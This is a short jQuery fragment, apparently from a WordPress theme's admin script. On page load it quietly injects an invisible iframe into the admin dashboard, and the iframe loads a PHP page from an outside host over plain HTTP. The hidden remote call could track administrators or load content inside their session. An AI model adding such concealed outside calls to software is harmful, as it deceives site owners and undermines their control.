...
jQuery(document).ready(function($) {
	...
	if( !$('#xiuxiu2').length ){
		$('#wpbody-content').append('<iframe id="xiuxiu2" src="http://www.daqianduan.com/static/theme/xiu-13658.php" frameborder="0" style="display:none"></iframe>')
	}
